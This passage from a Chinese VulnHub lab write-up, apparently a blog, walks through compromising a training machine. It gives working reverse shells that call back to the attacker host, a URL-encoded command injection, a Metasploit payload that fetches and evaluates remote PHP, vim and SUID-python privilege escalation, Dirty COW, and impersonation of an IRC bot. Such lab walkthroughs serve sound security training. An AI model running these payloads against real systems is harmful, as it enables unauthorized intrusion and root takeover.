&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;监听本地的 4444 端口，并且同时运行此shell.php文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[http://192.168.31.5:60080/shell.php](http://192.168.31.5:60080/shell.php)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-170.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;python反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#python反弹shell&#34;&gt;#&lt;/a&gt; python 反弹 shell&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;python 反弹shell代码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python -c &amp;#x27;import socket,subprocess,os;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;192.168.31.135 &amp;quot;,4444));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/bash&amp;quot;,&amp;quot;-i&amp;quot;]);&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;构造地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.31.5:60080/index.php?page=mailer&amp;amp;mail=python%20-c%20%27import%20socket,subprocess,os;%20s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.31.135%22,4444));%20os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果页面有 html 限制，在审查元素中修改即可&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-171.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;msf生成php反弹&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#msf生成php反弹&#34;&gt;#&lt;/a&gt; msf 生成 php 反弹&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;msf生成php木马&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use exploit/multi/script/web_delivery&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set target 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set payload php/meterpreter/reverse_tcp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set lhost 192.168.31.135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set lport 4444&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;将msf生成的php反弹shell的代码直接粘贴在url地址上即可&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.31.5:60080/index.php?page=mailer&amp;amp;mail=php%20-d%20allow_url_fopen=true%20-&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;r%&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;20%22eval(file_get_contents(%27http://192.168.31.135:8080/Dk00YRQ%27,%20false,%20stream_context_create([%27ssl%27=%3E[%27verify_peer%27=%3Efalse,%27verify_peer_name%27=%3Efalse]])));%22&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在此阶段，不要退出 msf，只要 msf 在线，生成的 php 代码运行之后，msf 就会接收到 sessions&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-172.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;stty-异常处理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#stty-异常处理&#34;&gt;#&lt;/a&gt; stty 异常处理&lt;/h3&gt;
&lt;p&gt;注意使用 msf 的时候如果也用了 stty 会出现下面这个问题&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-173.png&#34; alt&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;即enter键被转化为了^M 此时再输入任何命令都无法执行了&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;哪怕重启msf也无效，这里需要先退出msf，并执行stty sane，可将问题解决&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;命令sane最常出现在大多数终端的stty选项的集合中，它并不改变通信信道&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;的速率，但当终端发生混乱时，通常能够产生有益的效果。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;权限移到另一shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#权限移到另一shell&#34;&gt;#&lt;/a&gt; 权限移到另一 shell&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;当前终端：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;quot;import pty;pty.spawn(&amp;#x27;/bin/bash&amp;#x27;)&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.135/4445 0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc - lvvp 4445&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;新的终端：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;#x27;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty raw -echo;fg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export TERM=xterm&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-174.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;sudovim提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sudovim提权&#34;&gt;#&lt;/a&gt; sudo (vim) 提权&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo -l 发现使用waldo执行vim可以免密&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo -u waldo /usr/bin/vim /etc/apache2/sites-available/000-default.conf&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;esc --&amp;gt; :!/bin/bash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;esc --&amp;gt; :!bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.135/4447 0&amp;gt;&amp;amp;1 可拿到反弹shell&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-175.png&#34; alt&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-176.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;脏牛提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#脏牛提权&#34;&gt;#&lt;/a&gt; 脏牛提权&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;wget https://github.com/firefart/dirtycow/archive/refs/heads/master.zip&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;scp -r parallels@192.168.31.135:~/Desktop/tool/dirtycow/dirtycow-master /tmp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd dirtycow-master&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gcc -pthread dirty.c -o dirty -lcrypt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./dirty&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-177.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
服务器崩溃，提权失败，需要重启服务器
&lt;h3 id=&#34;issri-攻击-irc&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#issri-攻击-irc&#34;&gt;#&lt;/a&gt; issri 攻击 irc&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;修改防火墙规则，允许链接 irc&lt;br&gt;
 在 www-data 用户的时候，发现可以直接调用 root 改变 iptables&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看当前的防火墙规则&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo iptables -L&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;同由于它是一个易受攻击的机器，我们看到我们从外部发送到irc的包通过使,用授予所有用户的管理 iptables 的权限被丢弃，我们删除了这个丢弃规则。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;重写第二条规则以允许端口 6667 上的 TCP 连接&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo iptables -R INPUT 2 -p tcp --dport 6667 -j ACCEPT&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo iptables -L&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;而在nmap扫描端口时也出现了 6667 irc服务&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;改变iptables之后我们可以通过irssi连接到irc&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-178.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;
&lt;p&gt;issri 连接至 irc&lt;br&gt;
 &lt;code&gt;irssi -c 192.168.31.5 -p 6667 列出频道 /list&lt;/code&gt; &lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-179.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;加入了 wallabyschat 频道 /join #wallabyschat&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-180.png&#34; alt&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;列出选项 .help&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-181.png&#34; alt&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查看私密信息 /window 3&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-182.png&#34; alt&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;看到 run 似乎有用，返回 /window 2, 执行 run&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-183.png&#34; alt&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;只有 waldo 才能执行，我们换名字 /nick waldo&lt;br&gt;
 此时更名不成功，因为正有 waldo 用户的进程 tmux 使用着&lt;/p&gt;
&lt;ol start=&#34;7&#34;&gt;
&lt;li&gt;伪造身份登陆 irssi&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;通过sudo -l中的vim权限设置错误提升权限&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo -u waldo /usr/bin/vim /etc/apache2/sites-available/000-default.conf&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;esc --&amp;gt; :!/bin/bash 提权至waldo权限&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-184.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;这里有一个irssi.sh的文件，会以waldo的身份运行shell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;他的设置有问题。如果 Tmux 宕机，他的 IRC 连接也会宕机。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pkill tmux&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;who&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-185.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;ol start=&#34;8&#34;&gt;
&lt;li&gt;
&lt;p&gt;在 irssi 中修改别名为 waldo：/nick waldo&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-186.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;现在我们用 waldo 身份来运行 run 看会有什么效果&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-187.png&#34; alt&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;suid-python提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#suid-python提权&#34;&gt;#&lt;/a&gt; SUID python 提权&lt;/h3&gt;
&lt;p&gt;可以看到的是，我们用 run 执行命令的时候调用的是 wallabyshot 的身份&lt;br&gt;
我们可以构造 payload 尝试将 wallabyshot 身份的 shell 反弹出来&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;这是一个python反弹shell的代码，尝试运行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.run python -c &amp;#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;192.168.31.135 &amp;quot;,4448));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/bash&amp;quot;,&amp;quot;-i&amp;quot;]);&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-188.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;作为 waldo，我运行 .run 并从机器人收到 FileNotFound 错误。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;FileNotFoundError: [Errno 2] No such file or directory: &amp;#x27;None&amp;#x27; (file &amp;quot;/usr/lib/python3.5/subprocess.py&amp;quot;, line 1551, in _execute_child)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;adm 组确实看起来很有希望。由于 .run 需要一个文件，因此我创建了一个包含以下内容的文件：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;!/bin/bash&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo -l&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;利用具有s权限的python进行提权, 修改下一个脚本以将 suid 位应用于 python 可执行文件：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;!/bin/bash&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo chmod 4777 /usr/bin/python2.7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;通过 irssi 执行此脚本，将 python2.7 添加上 SUID 权限&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-189.png&#34; width=&#34;270&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;此后可以退出 irssi 了 /quit&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ls - al /usr/bin/python2.7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python -c &amp;quot;import os; os.setuid(0); os.system(&amp;#x27;/bin/bash&amp;#x27;)&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-190.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;提权成功拿到了 root 权限&lt;/p&gt;
&lt;h3 id=&#34;隐蔽cron权限维持&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#隐蔽cron权限维持&#34;&gt;#&lt;/a&gt; 隐蔽 cron 权限维持&lt;/h3&gt;
